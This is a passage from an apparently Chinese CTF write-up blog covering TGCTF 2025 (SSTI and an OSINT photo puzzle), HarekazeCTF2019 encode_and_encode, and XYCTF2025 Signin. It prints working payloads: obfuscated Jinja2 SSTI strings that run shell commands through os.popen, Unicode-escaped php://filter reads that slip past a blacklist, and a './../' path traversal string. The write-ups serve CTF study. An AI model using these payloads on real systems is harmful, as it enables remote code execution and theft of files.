class="hljs-number">5</span>fcla&#x27;&#x27;ss\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f&#x27;][&#x27;\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>fba&#x27;&#x27;se\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f&#x27;][&#x27;\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>fsubcl&#x27;&#x27;asses\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f&#x27;]()[<span class="hljs-number">132</span>][&#x27;\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>fin&#x27;&#x27;it\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f&#x27;][&#x27;\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>fglo&#x27;&#x27;bals\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f&#x27;][&#x27;po&#x27;&#x27;pen&#x27;](&#x27;cat /tgffff<span class="hljs-number">11111</span>aaaagggggggg&#x27;)[&#x27;re&#x27;&#x27;ad&#x27;]()难违<br><br>这样也行<br>&#123;&#123;&#x27;&#x27;.__class__.__mro__[<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">137</span>].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;</span>)&#125;&#125;<br><br>天命&#x27;&#x27;[<span class="hljs-string">&quot;<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\14</span>3<span class="hljs-char escape_">\15</span>4<span class="hljs-char escape_">\14</span>1<span class="hljs-char escape_">\16</span>3<span class="hljs-char escape_">\16</span>3<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\13</span>7&quot;</span>][<span class="hljs-string">&quot;<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\15</span>5<span class="hljs-char escape_">\16</span>2<span class="hljs-char escape_">\15</span>7<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\13</span>7&quot;</span>][<span class="hljs-number">1</span>][<span class="hljs-string">&quot;<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\16</span>3<span class="hljs-char escape_">\16</span>5<span class="hljs-char escape_">\14</span>2<span class="hljs-char escape_">\14</span>3<span class="hljs-char escape_">\15</span>4<span class="hljs-char escape_">\14</span>1<span class="hljs-char escape_">\16</span>3<span class="hljs-char escape_">\16</span>3<span class="hljs-char escape_">\14</span>5<span class="hljs-char escape_">\16</span>3<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\13</span>7&quot;</span>]()[<span class="hljs-number">137</span>][<span class="hljs-string">&quot;<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\15</span>1<span class="hljs-char escape_">\15</span>6<span class="hljs-char escape_">\15</span>1<span class="hljs-char escape_">\16</span>4<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\13</span>7&quot;</span>][<span class="hljs-string">&quot;<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\14</span>7<span class="hljs-char escape_">\15</span>4<span class="hljs-char escape_">\15</span>7<span class="hljs-char escape_">\14</span>2<span class="hljs-char escape_">\14</span>1<span class="hljs-char escape_">\15</span>4<span class="hljs-char escape_">\16</span>3<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\13</span>7&quot;</span>][&#x27;\<span class="hljs-number">137</span>\<span class="hljs-number">137</span>\<span class="hljs-number">142</span>\<span class="hljs-number">165</span>\<span class="hljs-number">151</span>\<span class="hljs-number">154</span>\<span class="hljs-number">164</span>\<span class="hljs-number">151</span>\<span class="hljs-number">156</span>\<span class="hljs-number">163</span>\<span class="hljs-number">137</span>\<span class="hljs-number">137</span>&#x27;][&#x27;\<span class="hljs-number">145</span>\<span class="hljs-number">166</span>\<span class="hljs-number">141</span>\<span class="hljs-number">154</span>&#x27;](<span class="hljs-string">&quot;<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\15</span>1<span class="hljs-char escape_">\15</span>5<span class="hljs-char escape_">\16</span>0<span class="hljs-char escape_">\15</span>7<span class="hljs-char escape_">\16</span>2<span class="hljs-char escape_">\16</span>4<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\05</span>0<span class="hljs-char escape_">\04</span>7<span class="hljs-char escape_">\15</span>7<span class="hljs-char escape_">\16</span>3<span class="hljs-char escape_">\04</span>7<span class="hljs-char escape_">\05</span>1<span class="hljs-char escape_">\05</span>6<span class="hljs-char escape_">\16</span>0<span class="hljs-char escape_">\15</span>7<span class="hljs-char escape_">\16</span>0<span class="hljs-char escape_">\14</span>5<span class="hljs-char escape_">\15</span>6<span class="hljs-char escape_">\05</span>0<span class="hljs-char escape_">\04</span>7cat /tgffff11111aaaagggggggg<span class="hljs-char escape_">\04</span>7<span class="hljs-char escape_">\05</span>1<span class="hljs-char escape_">\05</span>6<span class="hljs-char escape_">\16</span>2<span class="hljs-char escape_">\14</span>5<span class="hljs-char escape_">\14</span>1<span class="hljs-char escape_">\14</span>4<span class="hljs-char escape_">\05</span>0<span class="hljs-char escape_">\05</span>1&quot;</span>)难违<br><br>拿到flag<br></code></pre></td></tr></table></figure><hr><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="where-it-is-osint"><a href="#where-it-is-osint" class="headerlink" title="where it is(osint)"></a>where it is(osint)</h3><p><img src="/../image/TGCTF-2025-3.png"></p><p>一个图片，flag形式为TGCTF{右上角轨道到站的站名}），所以我们要根据这张图片找到轨道到站的站名。<br>这种题一般直接给谷歌识图就行了，我这里是自己分析的，虽然很模糊但是能看到后面的门上写着内湖xx大学，而且全是繁体字，推测这张照片在台湾，所以直接百度，搜到内湖社区大学。</p><p><img src="/../image/TGCTF-2025-4.png"></p><p>港墘站，所以payload为</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">TGCTF</span><span class="hljs-template-variable">&#123;港墘站&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 比赛复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HarekazeCTF2019-encode_and_encode</title>
      <link href="/2025/04/08/HarekazeCTF2019-encode-and-encode/"/>
      <url>/2025/04/08/HarekazeCTF2019-encode-and-encode/</url>
      
        <content type="html"><![CDATA[<h1 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="HarekazeCTF2019-encode_and_encode"></a>HarekazeCTF2019-encode_and_encode</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="json-decode"><a href="#json-decode" class="headerlink" title="json_decode"></a>json_decode</h3><p><strong>这个函数可以解析Unicode，所以我们可以通过Unicode编码来绕过黑名单或者关键字过滤</strong></p><p>例如</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-variable">php</span>:<span class="hljs-comment">//filter/convert.base64-encode/resource=/flag</span><br><br>&#123;<span class="hljs-string">&quot;page&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-char escape_">\u0070</span><span class="hljs-char escape_">\u0068</span><span class="hljs-char escape_">\u0070</span>://filter/convert.base64-encode/resource=/<span class="hljs-char escape_">\u0066</span>\u006c<span class="hljs-char escape_">\u0061</span><span class="hljs-char escape_">\u0067</span>&quot;</span>&#125;<br></code></pre></td></tr></table></figure><hr><p>首先打开，看到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>  <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;<br>  <span class="hljs-variable">$banword</span> = [<br>    <span class="hljs-comment">// no path traversal</span><br>    <span class="hljs-string">&#x27;\.\.&#x27;</span>,<br>    <span class="hljs-comment">// no stream wrapper</span><br>    <span class="hljs-string">&#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;</span>,<br>    <span class="hljs-comment">// no data exfiltration</span><br>    <span class="hljs-string">&#x27;flag&#x27;</span><br>  ];<br>  <span class="hljs-variable">$regexp</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$banword</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$regexp</span>, <span class="hljs-variable">$str</span>)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-variable">$body</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-variable">$json</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$body</span>, <span class="hljs-literal">true</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$body</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$json</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$json</span>[<span class="hljs-string">&#x27;page&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$page</span> = <span class="hljs-variable">$json</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>  <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$page</span>);<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$content</span> || !<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$content</span>)) &#123;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;<br>  &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment">// no data exfiltration!!!</span><br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;</span>, <span class="hljs-string">&#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;</span>, <span class="hljs-variable">$content</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;content&#x27;</span> =&gt; <span class="hljs-variable">$content</span>]);<br></code></pre></td></tr></table></figure><p>代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>  <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;<br>  <span class="hljs-variable">$banword</span> = [<br>    <span class="hljs-comment">// no path traversal</span><br>    <span class="hljs-string">&#x27;\.\.&#x27;</span>,<br>    <span class="hljs-comment">// no stream wrapper</span><br>    <span class="hljs-string">&#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;</span>,<br>    <span class="hljs-comment">// no data exfiltration</span><br>    <span class="hljs-string">&#x27;flag&#x27;</span><br>  ];<br>  <span class="hljs-variable">$regexp</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$banword</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$regexp</span>, <span class="hljs-variable">$str</span>)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-variable">$body</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-comment">//用变量body获取post数据</span><br><span class="hljs-variable">$json</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$body</span>, <span class="hljs-literal">true</span>);<br><span class="hljs-comment">//对body变量进行json解码</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$body</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$json</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$json</span>[<span class="hljs-string">&#x27;page&#x27;</span>])) &#123;<span class="hljs-comment">//判断body变量是否有效，json数据要有page</span><br>  <span class="hljs-variable">$page</span> = <span class="hljs-variable">$json</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>  <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$page</span>);<span class="hljs-comment">//从page中读出文件名，并读取文件</span><br>  <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$content</span> || !<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$content</span>)) &#123;<span class="hljs-comment">//检查content是否有效,即不能明文传输flag文件，利用php伪协议绕过</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;<br>  &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment">// no data exfiltration!!!</span><br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;</span>, <span class="hljs-string">&#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;</span>, <span class="hljs-variable">$content</span>);<span class="hljs-comment">//如果查到content里有ctf，用censored替代</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;content&#x27;</span> =&gt; <span class="hljs-variable">$content</span>]);<span class="hljs-comment">//最后将json编码后的content输出</span><br><br></code></pre></td></tr></table></figure><p>这里有一个is_valid函数，相当于黑名单，过滤了一些关键字，之后就是接收数据流和json的解码了。</p><p>最后我们要通过$content &#x3D; file_get_contents($page);这行代码来利用任意文件读取漏洞，使用php的伪协议来读取&#x2F;flag的内容，然后读出的内容经过$content &#x3D; preg_replace(‘&#x2F;HarekazeCTF{.+}&#x2F;i’, ‘HarekazeCTF{&lt;censored&gt;}’, $content);这行代码加工后，读出来的内容会通过echo json_encode([‘content’ &#x3D;&gt; $content]);将我们读取到的内容通过json的格式返回给我们。</p><p>所以需要绕过两次waf，一个黑名单，一个content &#x3D; preg_replace(‘&#x2F;HarekazeCTF{.+}&#x2F;i’, ‘HarekazeCTF{<censored>}’,这个函数加工了。</censored></p><hr><p>绕过黑名单我们可以使用Unicode编码，而绕过preg_replace直接用伪协议php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resourc&#x3D;&#x2F;flag，使&#x2F;flag的内容被 filter 处理，最终通过 base64 编码的形式返回.</p><p><strong>payload：</strong></p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">&#123;&quot;page&quot;:&quot;<span class="hljs-symbol">\u0070</span><span class="hljs-symbol">\u0068</span><span class="hljs-symbol">\u0070</span>://filter/convert.base64-encode/resource=/<span class="hljs-symbol">\u0066</span><span class="hljs-symbol">\u006c</span><span class="hljs-symbol">\u0061</span><span class="hljs-symbol">\u0067</span>&quot;&#125;<br><br>或<br><br>php://filter/read=convert.base64-encode/resource=/flag<br><br>&#123;&quot;page&quot;:&quot;<span class="hljs-symbol">\u0070</span><span class="hljs-symbol">\u0068</span><span class="hljs-symbol">\u0070</span><span class="hljs-symbol">\u003a</span><span class="hljs-symbol">\u002f</span><span class="hljs-symbol">\u002f</span><span class="hljs-symbol">\u0066</span><span class="hljs-symbol">\u0069</span><span class="hljs-symbol">\u006c</span><span class="hljs-symbol">\u0074</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0072</span><span class="hljs-symbol">\u002f</span><span class="hljs-symbol">\u0072</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0061</span><span class="hljs-symbol">\u0064</span><span class="hljs-symbol">\u003d</span><span class="hljs-symbol">\u0063</span><span class="hljs-symbol">\u006f</span><span class="hljs-symbol">\u006e</span><span class="hljs-symbol">\u0076</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0072</span><span class="hljs-symbol">\u0074</span><span class="hljs-symbol">\u002e</span><span class="hljs-symbol">\u0062</span><span class="hljs-symbol">\u0061</span><span class="hljs-symbol">\u0073</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0036</span><span class="hljs-symbol">\u0034</span><span class="hljs-symbol">\u002d</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u006e</span><span class="hljs-symbol">\u0063</span><span class="hljs-symbol">\u006f</span><span class="hljs-symbol">\u0064</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u002f</span><span class="hljs-symbol">\u0072</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0073</span><span class="hljs-symbol">\u006f</span><span class="hljs-symbol">\u0075</span><span class="hljs-symbol">\u0072</span><span class="hljs-symbol">\u0063</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u003d</span><span class="hljs-symbol">\u002f</span><span class="hljs-symbol">\u0066</span><span class="hljs-symbol">\u006c</span><span class="hljs-symbol">\u0061</span><span class="hljs-symbol">\u0067</span>&quot;&#125;<br></code></pre></td></tr></table></figure><p>在bp中提交post请求即可</p><p>回显</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&#123;&quot;<span class="hljs-attribute">content</span>&quot;:<span class="hljs-string">&quot;ZmxhZ3swMDI3ODQ3YS02ODVhLTQxZjItYWI1Yi1lYzNlNWY2MjhmMjd9Cg==&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>base64解码</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">0027847</span>a-<span class="hljs-number">685</span>a-<span class="hljs-number">41</span>f2-ab5b-ec3e5f628f27&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> php伪协议 </tag>
            
            <tag> json绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Signin</title>
      <link href="/2025/04/08/XYCTF2025-Signin/"/>
      <url>/2025/04/08/XYCTF2025-Signin/</url>
      
        <content type="html"><![CDATA[<h1 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h1><p><a href="https://www.cnblogs.com/LAMENTXU/articles/18730353">参考wp</a></p><p>源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">@File    :   main.py</span><br><span class="hljs-string">@Time    :   2025/03/28 22:20:49</span><br><span class="hljs-string">@Author  :   LamentXU </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">flag in /flag_&#123;uuid4&#125;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">from</span> bottle <span class="hljs-keyword">import</span> Bottle, request, response, redirect, static_file, run, route<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;../../secret.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    secret = f.read()<br><br>app = Bottle()<br><span class="hljs-meta">@route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;HI&#x27;&#x27;&#x27;</span><br><span class="hljs-meta">@route(<span class="hljs-params"><span class="hljs-string">&#x27;/download&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>():<br>    name = request.query.filename<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;../../&#x27;</span> <span class="hljs-keyword">in</span> name <span class="hljs-keyword">or</span> name.startswith(<span class="hljs-string">&#x27;/&#x27;</span>) <span class="hljs-keyword">or</span> name.startswith(<span class="hljs-string">&#x27;../&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;\\&#x27;</span> <span class="hljs-keyword">in</span> name:<br>        response.status = <span class="hljs-number">403</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Forbidden&#x27;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(name, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        data = f.read()<br>    <span class="hljs-keyword">return</span> data<br><br><span class="hljs-meta">@route(<span class="hljs-params"><span class="hljs-string">&#x27;/secret&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">secret_page</span>():<br>    <span class="hljs-keyword">try</span>:<br>        session = request.get_cookie(<span class="hljs-string">&quot;name&quot;</span>, secret=secret)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session <span class="hljs-keyword">or</span> session[<span class="hljs-string">&quot;name&quot;</span>] == <span class="hljs-string">&quot;guest&quot;</span>:<br>            session = &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;guest&quot;</span>&#125;<br>            response.set_cookie(<span class="hljs-string">&quot;name&quot;</span>, session, secret=secret)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Forbidden!&#x27;</span><br>        <span class="hljs-keyword">if</span> session[<span class="hljs-string">&quot;name&quot;</span>] == <span class="hljs-string">&quot;admin&quot;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;The secret has been deleted!&#x27;</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Error!&quot;</span><br>run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8080</span>, debug=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><h3 id="路径穿越"><a href="#路径穿越" class="headerlink" title="路径穿越"></a><strong>路径穿越</strong></h3><p>可以看到存在download路由</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xl">def download():<br>    <span class="hljs-keyword">name</span> = request.query.filename<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;../../&#x27;</span> <span class="hljs-built_in">in</span> <span class="hljs-keyword">name</span> <span class="hljs-built_in">or</span> <span class="hljs-keyword">name</span>.startswith(<span class="hljs-string">&#x27;/&#x27;</span>) <span class="hljs-built_in">or</span> <span class="hljs-keyword">name</span>.startswith(<span class="hljs-string">&#x27;../&#x27;</span>) <span class="hljs-built_in">or</span> <span class="hljs-string">&#x27;\\&#x27;</span> <span class="hljs-built_in">in</span> <span class="hljs-keyword">name</span>:<br>        response.status = <span class="hljs-number">403</span><br>        return <span class="hljs-string">&#x27;Forbidden&#x27;</span><br>    <span class="hljs-keyword">with</span> open(<span class="hljs-keyword">name</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">data</span> = f.read()<br>    return <span class="hljs-keyword">data</span><br><br></code></pre></td></tr></table></figure><p>这里只禁止了两个连在一起的..&#x2F;..&#x2F;和开头的..&#x2F;直接用.&#x2F;绕过即可</p><p>payload：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/download?filename=./</span>..<span class="hljs-regexp">/./</span>..<span class="hljs-regexp">/./</span>../secret.txt<br></code></pre></td></tr></table></figure><p>读取到了secret.txt</p><figure class="highlight angelscript"><table><tr><td 